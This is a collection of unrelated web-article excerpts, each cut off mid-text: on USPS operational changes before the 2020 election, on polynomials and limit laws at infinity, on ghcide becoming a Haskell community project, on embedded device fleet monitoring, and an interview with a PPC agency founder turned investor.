<li><strong>Mail truck changes: </strong>Part of DeJoy’s changes have been to enforce <a href="https://www.forbes.com/sites/alisondurkee/2020/08/24/postmaster-general-louis-dejoy-usps-board-chairman-robert-duncan-testify-house-oversight-hearing-postal-service/#570a9f6f6d5a'" rel="noopener" target="_blank"><span>strict departure times</span></a> for the larger mail carrier trucks that traverse the nation. The effort, meant to keep the agency moving on schedule, has led to perverse outcomes such as these trucks traveling <a href="https://www.newschannel5.com/news/newschannel-5-investigates/postal-trucks-sometimes-travel-across-country-with-no-mail-after-usps-cuts" rel="noopener" target="_blank"><span>completely empty</span></a>.</li>
</ul>
<div><p>These changes have been decried publicly by Democrats (including <a href="https://www.npr.org/2020/08/13/902109991/trump-admits-to-opposing-funding-for-postal-service-to-block-more-voting-by-mail" rel="noopener" target="_blank"><span>Joe Biden</span></a>), civil society organizations, and <a href="https://theintercept.com/2020/07/29/usps-postal-service-privatization/" rel="noopener" target="_blank"><span>USPS employees</span></a>. At least <a href="https://www.forbes.com/sites/alisondurkee/2020/08/25/more-than-20-states-attorneys-general-suing-postal-service-usps-changes-despite-dejoy-reversal/#56a2d0d04533" rel="noopener" target="_blank"><span>20 states</span></a> have sued DeJoy over the changes. And malicious or not, the changes have pretty clearly led to a widespread impacts on the USPS’s ability to deliver mail in a timely manner — all at a time when Americans are relying on it in several ways.</p></div>
<h3><strong>Will DeJoy’s Changes Influence the Election?</strong></h3>
<p>Through two testimonies, DeJoy was adamant that <a href="https://abcnews.go.com/Business/postal-service-flashpoint-ahead-2020-election/story?id=72420566" rel="noopener" target="_blank"><span>no further changes</span></a> would be made prior to the elections and insisted that the USPS is <a href="https://www.vox.com/2020/8/22/21396968/uses-postal-service-democrats-special-session-dejoy-trump-25-billion-election-voting" rel="noopener" target="_blank"><span>highly confident</span></a> in delivering mail-in ballots on time. Many are quick to point out that the anticipated surge in ballot-related mail is really just a <a href="https://reason.com/2020/08/21/post-office-expects-9-billion-loss-this-year-but-will-prioritize-mail-in-ballots-before-election-day/" rel="noopener" target="_blank"><span>drop in the bucket</span></a> in the grand scheme of the <a href="https://www.washingtonexaminer.com/opinion/columnists/a-reality-based-look-at-trump-and-the-post-office" rel="noopener" target="_blank"><span>471 million pieces</span></a> of mail the USPS deals with daily. Additionally, USPS workers assign <a href="https://www.vox.com/recode/2020/8/7/21358946/postal-service-mail-delays-election-trump-mail-in-ballots" rel="noopener" target="_blank"><span>utmost priority to ballot-related mail</span></a>, and DeJoy has indicated that they will even <a href="https://www.foxnews.com/politics/house-republicans-deny-usps-delays-despite-evidence-of-service-failures" rel="noopener" target="_blank"><span>give ballots priority</span></a> over first-class mail if needed.&nbsp;</p>
<p>“We will deploy processes and procedures that advances any election mail, in some cases ahead of first class mail.” - <a href="https://www.foxnews.com/politics/house-republicans-deny-usps-delays-despite-evidence-of-service-failures" rel="noopener" target="_blank"><span>Postmaster DeJoy</span></a></p>
<div><p>A series of letters sent out by the USPS to <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>46 states</span></a> prior to the election warned of the danger of ballots not being delivered on time, creating further concern for election watchers. However, the letters appear to be more of a matter of routine, impressing the importance of having voting deadlines that provide the USPS plenty of time to do their job, given past examples of sudden gluts of ballot related mail. These concerns don’t appear to be driven by DeJoy’s changes.</p></div>
<p><span><img src="https://lh6.googleusercontent.com/T_f9bCh1Zar2xUOsrrzOIgmwCMXD3B6gCv164mzuqlRX0UqFBTmzTf9ZFrstQXqO02MoQZ-GNbVTvqPgZHFpGcZAIFAmNgXPlr3OtQ5dAjxg7V4hd2zEgBkbxsTyWdVLoyBL8PzI" width="343" height="343"></span></p>
<p><br>But these formal assurances will do little to settle the nerves of those concerned with the upcoming election. In the context of the doubt President Trump has cast on mail-in ballots and the heated nature of the election, there is little room for error. Were ballots not to arrive on time, it could have outsized impacts in battleground states and cast doubt on close results. And <a href="https://www.salon.com/2020/08/21/leaked-email-us-postal-service-instructs-workers-not-to-reconnect-sorting-machines/" rel="noopener" target="_blank"><span>reports from …</span></a></p></span></p></div></div></div></div></div></div></div></div></div></div></div>

The names? <strong>Polynomial</strong> and <a href="https://mathvault.ca/math-glossary/#infinite"><strong>infinity</strong></a>! While the former&nbsp;might have sounded a bit like the name of a <em>snake</em>, polynomials is a <em>one-of-its-kind</em> mathematical entity whose perfection defies our mathematical imagination.</p><p>For one, polynomials are well-known for being&nbsp;<em>infinitely smooth</em> and <em>never-ending</em>, while at the same time, they could be a <em>line</em>, a <em>parabola</em>, or any&nbsp;kind of weird, <strong>infinitely-malleable curve</strong>&nbsp;ready to&nbsp;assume&nbsp;any shape drawn without <em>lifting</em> the pencil (kind of). Heck, polynomials are a&nbsp;favorite object of <em>platonic desire</em> among math enthusiasts. Talk about the <em>interaction</em> between polynomial and infinity!</p><p>So with all that goodness, it makes sense for us to inquire a bit as to why despite of having similar forms, the behaviors of polynomials at the infinities differ, leading to some seemingly unrelated insights about their <strong>properties</strong> in general.</p><p>All right. Enough said. Time to buckle the seat belt, and let the theoretical musing begins! <span id="more-7079"></span></p><h2 id="poly"><span id="Polynomials_%E2%80%94_A_Review"></span><a href="#toc">Polynomials — A Review</a><span></span></h2><p>A <em>non-zero</em>,&nbsp;real-valued function of the form $\displaystyle&nbsp;cx^n$ — where $c \in \mathbb{R} \setminus \{ 0 \}$ and $n \in \mathbb{N}$ — forms the building blocks of polynomials. For that reason, they are usually called the (non-zero)<strong> monomials</strong>, with&nbsp;the number $n$ being the <strong>degree</strong> of the monomial in question. For example, the <em>constant function</em> $\frac{\pi}{4}$ represents a monomial with degree $0$, whereas the function $ex^{666}$ would be a monomial with degree $666$ (!).</p><p>(for the record, the <em>zero function</em> also falls into the category of monomials, except that its degree is usually left <em>undefined</em>, for the obvious reason that it can be expressed <em>numerous</em> forms).</p><p>Once there, we can define a <strong>non-zero polynomial</strong> as a function of the form:</p><p>\begin{align*} f_1(x)+ \dots + f_m(x) \end{align*}</p><p>where $m \in \mathbb{N_+}$ (i.e., a <em>positive</em> integer) and each $f_i(x)$ is&nbsp;a&nbsp;<em>non-zero</em> monomial.</p><p>In which&nbsp;case, we define the <strong>degree</strong> of a <em>non-zero</em> polynomial as the <em>maximal</em> degree of its monomials (always well-defined, since there’s only a <em>finite</em> number of&nbsp;monomials). For example, the constant function $\frac{\ln 2 + 3}{2e}$ represents&nbsp;a polynomial of degree $0$, and&nbsp;the function $3 + 2x^3 + x + x^2$ a polynomial of degree $3$.</p><p>(as with before, the <em>zero function</em>&nbsp;still falls into the category of polynomials, with the caveat that its degree is usually left undefined — due to the ambiguity of its leading term)</p><p>For the sake of <em>simplicity</em> and <em>consistency</em> though, we usually prefer to write a <em>non-zero</em> polynomial by gathering up the <em>like terms</em>, and rearranging the resulting terms so that the monomials are presented in increasing/decreasing order based on&nbsp;their degrees. Once that’s done, we refer to the monomial of the highest degree as the <strong>leading term</strong> of the polynomial, and its coefficient the <strong>leading coefficient</strong> of the polynomial.</p><p>For example, instead of writing $10x^3+2x^2+ 5x+ 6x^2 + 5 + 2 x^3$ as our polynomial, we prefer to regroup the like terms and rewrite it as $12x^3 + 8x^2 + 5x + 5$, from which it can be seen&nbsp;that we have a polynomial of <em>degree</em> $3$ (i.e., a <strong>cubic polynomial</strong>) — with $12$ as&nbsp;the <em>leading coefficient</em>.</p><p>In general, a <em>non-zero</em> polynomial can have <em>any</em> non-zero number as leading coefficient. However, in the special case where the leading coefficient is $1$, it is as if it it&nbsp;kind of disappears out of sight.&nbsp;In which case, we refer to the said polynomial as a <strong>monic polynomial</strong>.</p><p>In addition, since&nbsp;every <em>non-zero</em> polynomial can be re-expressed in terms of<em>&nbsp;monic polynomial</em>&nbsp;by <em>factoring out</em> the leading coefficient,&nbsp;it sometimes makes sense to&nbsp;analyze the properties of a non-zero polynomial by looking instead at the properties&nbsp;of its <em>underlying&nbsp;monic polynomial</em>.</p><p>Alternatively, we can also define a polynomial <em>recursively</em>&nbsp;as follows:</p><div><p>Definition 1 — Recursive Definition of Polynomial</p><div><p><em>A&nbsp;real-valued</em> function $p(x)$ is a <strong>polynomial</strong> if and only if it satisfies one of the two following options — through a <em>finite</em> number of iterations:</p><ol><li>$p(x)=c$ for some $c \in \mathbb{R}$ (i.e., a <em>constant function</em>).</li><li>$p(x) = x q(x) + c$, where $q(x)$ is a <em>polynomial</em> and $c \in \mathbb{R}$.</li></ol></div></div><p>For example, $x^2 + 2x + 1$ is a polynomial by the standard of this&nbsp;<em>recursive definition</em>, since $x^2+2x+1 = x ( x+2) + 1$, where $x+2$ is very well a polynomial (why?) and $1$ very well a constant. In general, the recursive definition of polynomial suggests a way of <em>reducing</em> a polynomial of degree $n+1$ to that of degree $n$ — an handy insight when it comes to proving facts about <em>non-zero</em> polynomials using the so-called&nbsp;<strong>mathematical induction</strong> on the <em>degree</em> of polynomials.</p><h2 id="inflim"><span id="A_Venture_Into_the_Infinite_Limits"></span><a href="#toc">A Venture Into the&nbsp;Infinite Limits</a><span></span></h2><p>When tackling the behavior of a function at the infinities, it makes sense that we equip ourselves with some <strong>limit laws</strong>&nbsp;on how <em>infinity-converging</em> and <em>constant-converging</em> functions&nbsp;interact with each other. To that end, we present the following&nbsp;<em>6</em> sets of&nbsp;limit laws for your pleasure. 🙂</p><h3 id="constantfunction"><span id="Interactions_Between_InfinityConverging_and_Constant_Functions"></span><a href="#toc">Interactions Between Infinity-Converging and Constant Functions</a><span></span></h3><p>To start off, let’s imagine that we have a function $f(x)$ and a constant function $c$, where $f \to \infty$ as $x \to \infty$. The question is, what does the function $f(x) + c$ tends to — if any&nbsp;— as $x \to \infty$?</p><p>Here, it shouldn’t be a surprise that $f(x)+c$ converges to $\infty$ as well. To see why, we first note that since $f \to \infty$ as $x \to \infty$, the <strong>definition of limit</strong> implies that:</p><blockquote><p>Given <em>any</em>&nbsp;number — however <em>large</em> — there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>exceeds</em> this number.</p></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &gt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &gt; &nbsp;r \qquad (\forall x \in N) \end{align*}</p><p>thereby&nbsp;showing that the function $f(x) + c$ increases&nbsp;<em>beyond bound</em>&nbsp;as $x \to \infty$ — regardless of the value of&nbsp;$c$.</p><p>Naturally, this leads to the following question: what if $f$ actually converges to $-\infty$ instead as&nbsp;$x \to \infty$? Well, referring to the <em>definition of limit</em> again,&nbsp;we have that:</p><blockquote><p>Given <em>any</em>&nbsp;number — however <em>negative</em>&nbsp;— there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>precedes</em>&nbsp;this number.</p></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &lt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &lt; r \qquad (\forall x \in N) \end{align*}</p><p>hence&nbsp;showing that the function $f(x) + c$ decreases&nbsp;<em>beyond bound</em>&nbsp;$x \to \infty$, and this again regardless of the <em>sign</em> and <em>size</em> of&nbsp;$c$. Putting everything together, we obtain&nbsp;our <em>first</em> set of limit laws concerning <strong>constant functions</strong>:</p><div><p>Proposition 1 — Limit Laws Concerning Constant Functions (Sum)</p><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the function&nbsp;$f(x)+c$ converges to the <em>same</em> infinity $f(x)$ converges to — as $x \to \Box$.</p></div><p>Now, what about the cases where a function is <em>multiplied</em> by a constant, as in the case of $c f(x)$ where $c&gt;0$? Well, as logic would have dictated, the <strong>convergence behavior</strong> of $c f(x)$ should&nbsp;depend on what $f(x)$ converges to in the first place.</p><p>For example, if we know in advance that $f(x)$ converges to $\infty$ as $x \to \infty$, then the definition of limit would imply that given <em>any</em> number $r$ — no matter how&nbsp;<em>positive</em>&nbsp;— we can always&nbsp;find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &gt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &gt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ increases <em>without bound</em> as $x \to \infty$.</p><p>On the other hand, if $f(x) \to -\infty$ instead as $x \to \infty$ (remember that $c&gt;0$), then we can similarly infer that given <em>any</em> number $r$ — however&nbsp;<em>negative</em> — it is always possible to find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &lt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &lt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ decreases&nbsp;<em>without bound</em> as $x \to \infty$.</p><p>Now, this still leaves us with the scenario&nbsp;where $c$ is <em>negative</em>. In which case, using very similar&nbsp;arguments, it can still&nbsp;be shown that as $x \to \infty$:</p><ol><li>$f(x) \to +\infty$ implies that $cf(x) \to -\infty$.</li><li>$f(x) \to -\infty$ implies that $cf(x) \to +\infty$.</li></ol><p>So that if we combine these insights together, we get our <em>second</em> set of limit laws concerning <strong>constant functions</strong>:</p><div><p>Proposition 2 — Limit Laws Concerning Constant Functions (Product)</p><div><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the following cases apply as $x \to \Box$:</p><ol><li>If $c&gt;0$, then $c f(x)$ converges to the <em>same</em> infinity $f(x)$ converges to.</li><li>If $c&lt;0$, then $c f(x)$ converges to the <em>opposite</em>&nbsp;infinity $f(x)$ converges to.</li></ol></div></div><p>Interestingly, the above&nbsp;limit laws applies <em>irrespective of the size of $c$</em>. For example, $c$ could be $0.00001$ and $f(x)$ could converge to $+\infty$, and $cf(x)$ would have converged to $+\infty$ regardless. Likewise, $c$ could be $\frac{1}{e}$ and $f(x)$ could converge to $-\infty$, and $cf(x)$ would have converged to $-\infty$ regardless.</p><h3 id="infpluscon"><span id="Infinity_+_Constant"></span><a href="#toc">Infinity + Constant</a><span></span></h3><p>Moving from the constant functions into the general realm,&nbsp;let’s assume that we’re given two functions $f(x)$ and $g(x)$, such that as $x \to \infty$, $f$ converges to one of the infinities and $g$ converges to some real number $G$. The question is, what can we extrapolate about the <strong>convergence behavior</strong> of $f+g$ — if any?</p><p>Here, to figure this&nbsp;out, we begin by noticing that since $g$ converges to an <em>actual</em> number $G$, by …</p></section></div></div></div></div></div>

<p>We started building ghcide over 2 years ago as part of our efforts at Digital Asset to provide a great IDE experience to all <a href="https://daml.com/" target="_blank" rel="noreferrer noopener">DAML</a> users. As a lot of people in the Haskell community know, the DAML compiler is based on a modified version of GHC, so naturally the people working on it were Haskell programmers. As ghcide got better and better, and we got to experience it whenever we were working on DAML codebases, we started missing the same features from our Haskell development. Over time, we started abstracting over DAML-specifics and eventually managed to get it working on some hand-crafted Haskell projects, but couldn’t integrate with Cabal, Stack or other build tools. Around that time, we also open sourced the whole <a href="https://github.com/digital-asset/daml" target="_blank" rel="noreferrer noopener">DAML codebase</a> which included ghcide – but we didn’t announce ghcide anywhere. Luckily, at this time Matthew Pickering released <a href="https://github.com/mpickering/hie-bios" target="_blank" rel="noreferrer noopener">hie-bios</a> which made it trivial to integrate ghcide with all of the various build tools in the Haskell system while still using the same codebase as the basis for the DAML IDE.</p>



<p>External interest in ghcide was very limited until Neil gave a <a href="https://www.youtube.com/watch?v=cijsaeWNf2E&amp;list=PLxxF72uPfQVRdAsvj7THoys-nVj-oc4Ss" target="_blank" rel="noreferrer noopener">keynote at MuniHac 2019</a>. </p>

</div></figure>



<p>Interest and external contributions skyrocketed over a few days and we split ghcide into a separate repository to make it easier for contributors and users that no longer had to deal with the DAML monorepo. Since then, there have been a huge number of contributions to ghcide that not only benefited Haskell users, but also DAML users. It is impossible to name all the amazing features that have been contributed to ghcide, but some of our favourites include:</p>



<ul><li>Support for code completions</li><li>Many significant performance improvements</li><li>Multi-component support</li><li>A wide variety of code actions</li></ul>



<p>In January 2020, a lot of ghcide contributors and contributors from <a href="https://github.com/haskell/haskell-ide-engine/" target="_blank" rel="noreferrer noopener">haskell-ide-engine</a> got together and agreed to unify their efforts as part of <a href="https://github.com/haskell/haskell-language-server" target="_blank" rel="noreferrer noopener">haskell-language-server</a> – which builds on top of ghcide while carrying over all the features and plugins that came from haskell-ide-engine. Half a year later, it’s not a stretch to say that this endeavour has been an enormous success and enthusiastic statements from users can attest to this. Finally, most efforts on Haskell tooling are focused on a single approach and everyone can benefit from improvements.</p>



<p>As the importance of ghcide to Haskell tooling has grown, keeping such an important repository in the Digital Asset organisation with only Digital Asset employees as maintainers has started to hold back the flood of contributions. Therefore, in consultation with many of the contributors, Digital Asset has made the decision to turn ghcide into a proper community project under the <a href="https://github.com/haskell" target="_blank" rel="noreferrer noopener">haskell</a> github organization. In making this transition, ghcide gains a much wider team of maintainers, sourced from the current active ghcide contributors. The DAML IDE will switch to an open source fork of ghcide and cherry-pick changes from upstream as needed and we will continue to upstream bugfixes and improvements into ghcide.</p>



<p>We are very excited to see in which directions ghcide will grow in the future. Thanks to all ghcide contributors and in particular to Pepe Iborra, Matthew Pickering, Alan Zimmermann, wz1000, Luke Lau, Alejandro Serrano, fendor and Jacek Generowicz. We’ve enjoyed being part of the Haskell IDE tooling community, and look forward to working with both current and new contributors in the future.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>Releasing a connected device in today’s world without some form of monitoring in
place is a recipe for trouble. How would you know how often or if devices are
experiencing faults or crashing? How can the release lead be confident that no
connectivity, performance, or battery-life regressions have occurred between the
past and current firmware update?</p>

<p><strong>The answer is that you need device monitoring in place long before ever
shipping a firmware update to devices in the field.</strong></p>

<p>There have been several occasions in the past where I’ve introduced several
performance and battery-life regressions that were never caught in internal beta
testing of 50 devices. They were always subtle changes, such as an
“optimization” that ended up causing high file system churn (which reduced
battery life), or issues that crop up when connected over certain transports or
to different mobile phone models. These bugs were caught in one of two ways:
either a customer angry enough would submit a bug report, or we’d catch the
regression on our internal dashboards which were powered by our suite of SQL
queries that would run periodically.</p>

<!-- excerpt start -->

<p>In this post, we lay the foundation for how an organization should instrument
their embedded firmware to measure performance, stability, and the overall
“health” of each device and an entire fleet of devices. We also compare and
contrast the various approaches projects generally take to surface these metrics
and I’ll discuss why I believe heartbeat metrics are the best method for driving
product decisions.</p>

<!-- excerpt end -->

<blockquote>
  <p>This post is guaranteed to be the tip of the iceberg in a series of posts
about how to do device monitoring <em>properly</em> at scale. With this in mind, this
post will be slightly more high-level than a typical “Interrupt” post.</p>

<h2 id="fleet-monitoring-overview">Fleet Monitoring Overview</h2>

<p>Device and software monitoring is not a new concept. There have been many new
ambitious projects to solve the problem from a couple of devices to monitoring
millions of servers or containers.</p>

<p>I’d like to talk about a few different variations of monitoring and how they
relate to us in the world of embedded systems.</p>

<h3 id="application-performance-monitoring-apm">Application Performance Monitoring (APM)</h3>

<p>Application performance monitoring services collect and aggregate different
metrics on computer systems and software, and they alert customers when these
numbers either increase or decrease in abnormal ways. Common metrics that are
collected by APM’s are:</p>

<ul>
  <li>CPU, RAM, and hard drive usage</li>
  <li>Response times and values</li>
  <li>Request rates and failures</li>
</ul>

<p>They work by installing hooks in various places in the code. Common examples are
the pre/post request handlers for a web application and the pre/post handlers
for a database transaction. By hooking into both sides of common operations,
they can take a snapshot of the system before and after, and compare memory
usage and time deltas.</p>

<p>When an APM is hooked up to every instance of an application, it can paint a
detailed picture of how an application, server, or fleet of either are
performing at any given time.</p>

<p>APM’s aren’t a new concept, as one of the largest ones, New Relic, was founded
in 2008 and is now a publicly-traded company.</p>

<p><strong>Software services:</strong> New Relic<sup id="fnref:new_relic"><a href="#fn:new_relic">1</a></sup>, Datadog<sup id="fnref:datadog"><a href="#fn:datadog">2</a></sup>,
ScoutAPM<sup id="fnref:scout_apm"><a href="#fn:scout_apm">3</a></sup><br> <strong>Open Source Libraries</strong>: StatsD<sup id="fnref:statsd"><a href="#fn:statsd">4</a></sup>,
CollectD<sup id="fnref:collectd"><a href="#fn:collectd">5</a></sup>, Prometheus<sup id="fnref:prometheus"><a href="#fn:prometheus">6</a></sup></p>

<h3 id="tracing-and-logging">Tracing and Logging</h3>

<p>I’ve grouped these into a single group because they accomplish the same goal.</p>

<p>Traces and logs give you an in-depth timeline view of what happened on a single
device and allow you to zero-in on issues as long as you know what you are
looking for. They work by having the developer install logs or trace events
during the coding phase or automatically by installing hooks in the context
switch handler and various system API calls.</p>

<p>Traces and logs, just like an APM, can tell you where most of the time is spent
in an application or system, but there are drawbacks.</p>

<p>The amount of data collected by tracing and logging tools is immense, and most
of the data doesn’t get used or processed. In their raw form, they are not
easily aggregated or actionable.</p>

<p>I view tracing and logging as a silo of (valuable) data that is only queried
when developers <strong>know</strong> there is an issue with a specific device.</p>

<p><strong>Software services:</strong> New Relic<sup id="fnref:new_relic:1"><a href="#fn:new_relic">1</a></sup>, Datadog<sup id="fnref:datadog:1"><a href="#fn:datadog">2</a></sup><br> <strong>Firmware
services:</strong> Percepio<sup id="fnref:percepio"><a href="#fn:percepio">7</a></sup></p>

<h3 id="crash-reporting">Crash Reporting</h3>

<p>How nice would it be to have in-depth analysis and alerts for every unique
crash, fault, assert, and error log that devices in the field experience? That
is what these services provide.</p>

<p>When any of the listed error handlers are triggered, these libraries gather all
of the relevant data, such as previous logs, backtraces of the currently running
threads, local variables, global variables, etc. and push all of this data to a
central server to be processed. These issues are then de-duplicated and
presented in a bug-tracker like fashion to the user.</p>

<p>These systems usually require an SDK to be shipped with the application. These
services must build and support an SDK that is written in the same language and
for the same framework as the application they monitor.</p>

<p>For firmware, they would likely install hooks into the
<a href="https://interrupt.memfault.com/blog/asserts-in-embedded-systems">assert</a>,
<a href="https://interrupt.memfault.com/blog/cortex-m-fault-debug">fault</a>, and
<a href="https://interrupt.memfault.com/blog/firmware-logs-stack-trace">logging</a> handlers.</p>

<p>The beautiful thing about crash reporting tools is they are relatively easy to
integrate because the entry-points they hook into are standardized by the
language and frameworks. They also surface hard to reproduce or never before
seen issues easily and provide a wealth of data to fix the problem quickly.</p>

<h3 id="instantaneous-state-monitoring">Instantaneous State Monitoring</h3>

<p>This is the category that most of today’s “IoT monitoring solutions” fall into.
They assume a near-constant connection to the Internet and hold the state of
every device in the service.</p>

<p>Devices can either push this information whenever states change, at regular
intervals, or the remote server can pull data as well.</p>

<p>These systems ingest many of the system vitals that developers and managers want
to know, like heap usage, current battery life, or whether certain peripherals
are on or off. These values can be queried across the entire fleet or a subset
of devices, but trends or custom queries are more difficult.</p>

<p>For instance, attempting to query for the amount of time the Bluetooth radio is
on per day is nearly impossible, unless the infrastructure is <strong>100% certain</strong>
that it received every state change event from the device.</p>

<p>The statistic of time-active is a critical measurement for embedded devices, and
is one of the best predictors of battery-life drain and performance.</p>

<h3 id="what-about-embedded-systems">What About Embedded Systems?</h3>

<p>Most of the above services or strategies listed above do not apply to
constrained embedded systems. Save for Memfault and Percepio, most of the
solutions would require orders of magnitude more memory, CPU, power, and
Internet bandwidth.</p>

<p>There is hope though. We will explore how we can manage to get the most
important and actionable metrics out of embedded systems and gain an
understanding of how devices are performing in the field.</p>

<h2 id="logging-vs-metrics">Logging vs Metrics</h2>

<p>I want to quickly cover the difference and use-cases for two common forms of
data collected from systems: logs and metrics.</p>

<h3 id="logs">Logs</h3>

<p>Logs are immutable events that happened over time to a single device. They are
instrumental in debugging as they help a developer determine what happened
before and after issues occur.</p>

<p>Logs are usually forwarded from individual devices to a centralized datastore
such as S3, or to a log aggregator, such as Elastisearch, to be further
transformed and processed. Unfortunately, more often than not, the logs are
ingested and forgotten about.</p>

<p>A developer might dig up a particular device’s log files in response to a
customer support request, but that requires a <code>pull-logs-from-s3.py</code> script and
a decent amount of time to determine where the device behaved unexpectedly.</p>

<h3 id="metrics">Metrics</h3>

<p>Metrics are a set of numbers that give information about a particular process or
activity. They are measured over intervals of time and are usually just numbers.
This means that they are pre-processed and more compact than logs, which means
that you can store and query many more of them at once.</p>

<p>Metrics themselves don’t help developers debug individual instances of issues or
bugs, but they help organizations <strong>detect</strong> issues by measuring the data points
that matter most. For many hardware makers, these metrics might be:</p>

<ul>
  <li>Crash-free hours</li>
  <li>Average battery life</li>
  <li>Wi-Fi/BLE connected time per hour</li>
</ul>

<h3 id="transforming-logs-into-metrics">Transforming Logs into Metrics</h3>

<p>Logs can be transformed, processed, and aggregated into metrics, but this
usually involves massive and complex data pipelines.</p>

<p>After working as a firmware engineer at a few hardware companies in the past, I
can tell you that I was out of my depth trying to parse logs at scale, and I was
rarely getting the help I needed from the web and infrastructure teams because
they had their own roadmaps to complete.</p>

<p>The other problem with logs is that they generally log state transitions and
force the developer or log aggregator to measure the time between these state
transitions. Let’s try to calculate one of the important device metrics above,
Wi-Fi connected time per hour.</p>

<div><div><pre><code>[E][11:30:00] Wi-Fi connected
[W][11:45:00] Wi-Fi disconnected, reason: -2
[I][12:30:00] Wi-Fi connected
</code></pre></div></div>

<p>This calculation is relatively easy assuming we can process logs linearly. We
see at 11:30 the device was connected to Wi-Fi, then disconnected at 11:45, so
the time connected this hour was 15 minutes.</p>

<p>Let’s present a problem that happens all the time with embedded systems.</p>

<div><div><pre><code>[E][11:30:00] Wi-Fi connected

# Wi-Fi disconnect event lost by device or in transport

[I][12:30:00] Wi-Fi connected
</code></pre></div></div>

<p>Oh no! A dropped log message.</p>

<p>Can we compute accurately how long the device was connected to Wi-Fi given the
information above? <strong>No we can’t</strong>. We’d probably throw away this event during
processing or accidentally include it and say Wi-Fi was connected for the entire
hour.</p>

<p>We can do …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Running a profitable agency is hard.</p><p>Using said profits to reinvest into real estate, stocks and tech startups is much harder. Jay Vasantharajah did exactly that. He is a very inspiring entrepreneur who has built an award-winning PPC agency and 7-figure eCommerce business. Something tells me this empire is just starting. I was curious to learn about his story and hear about what built his discipline to focus on cashflow and create an impressive investment portfolio.</p><p>‍</p><p><strong>How did you get started in digital marketing?</strong></p><p>I started building websites for fun, and eventually convinced a small local accountant that I could build him a website. I think I made $500 for it, and quickly realized that I really enjoyed building websites. I went on to build&nbsp; websites for all the student councils in my university.</p><p>I then started learning PPC and SEO to help my dad drive business for his airport limo business. By the time I graduated university (I studied finance and accounting btw) I had a pretty good handle of digital marketing and web development.</p><p>‍</p><p><strong>What is the origin story behind your agency, ClientFlo?</strong></p><p>I spotted the opportunity when I came across a large communication company selling a packaged PPC service to SMBs across Canada. The PPC packages being offered were terrible; they&nbsp; consisted of cookie cutter landing pages and copy/pasted campaign setups, and the results were terrible.</p><p>Yet this company was selling these PPC packages like hot cakes. I would spend hours reading and analyzing the negative consumer reviews. The demand for these services was there, and I knew based on my knowledge I could do better. And that’s when I decided to start ClientFlo out of my condo. I had no clients or connections, but the confidence that I could offer SMB’s better services.&nbsp;</p><p>I incorporated ClientFlo on a Friday, starting cold calling the following Monday and closed my first client within a week. That instantly gave me the confidence to keep going, close more clients and to grow my company. I would spend all day cold-calling potential clients, stay up all night managing the campaigns. Once ClientFlo had around 10 clients, I knew it was time to get help and a start to build a team.</p><p>As ClientFlo continued to grow, we moved to our first office.</p><figure id="w-node-679817d579f7-8b48bcde"><p><img src="https://uploads-ssl.webflow.com/5ac26aa260db49e86f48bcdc/5f4ea500bc40bb28d71956d6_n4pj6bovIRI1ZU927m4iAqUKwOKelJ8HXRsUwG8iCIH4BzPYSoesJEqQTCL-cTFGd7A8Y9iHwnoAp9d3e2NpADmTuMVvcHv40o6sS8MHylx-fdS0ZH0urbWFkxevwhVfeJMxUDbW.jpeg" alt=""></p></figure><p>‍</p><p><strong>At the peak of the agency, what was the annual revenue and how many employees?</strong></p><p>Low seven-figures per year with about 5 full-time employees (including myself) and a couple contractors.</p><p>‍</p><p><strong>How did you get initial sales for the agency?</strong></p><p>Straight <a href="https://jayvas.com/cold-calling-isnt-dead-and-why-all-entrepreneurs-should-learn-it/">cold-calling clients</a>. It was a grind, but ended up being very effective. I highly recommend all entrepreneurs to try cold-calling as early in their career as possible. It’s the “school of hard knocks” way to learn how to sell. And as any successful entrepreneur would tell you, the selling never stops - so get great at it!</p><p>‍</p><p><strong>Describe the process of being a general investor from an agency operator?</strong></p><p>Investing, for me, started way before my agency, ClientFlo. The cash-flow from my agency accelerated the growth of my investments portfolio.</p><p>I started my investing career <a href="https://jayvas.com/charlie-munger-is-right-haul-ass-for-your-first-100k/">buying a cash-flowing real estate property</a>, which made it easier for me to quit my job and start ClientFlo. I continued to reinvest cash flows from ClientFlo into more real estate and stocks. As my cash flows and asset values continued to snowball, it enabled me to <a href="https://jayvas.com/investing/">invest in riskier/higher potential opportunities</a> like my <a href="https://www.starterstory.com/stories/how-we-re-expanding-our-product-line-and-growing-our-top-line">eCommerce business</a> and tech startups. I now manage a diversified portfolio of investments full-time.</p><p>‍</p><p><strong>What are the major lessons you’ve learned from growing the agency?</strong></p><p>Since this was my first business, I quickly learned how to be an entrepreneur.&nbsp; In entrepreneurship, perseverance is key. Things are given to you and taken from you, so don't let either get to your head. Stay focused, 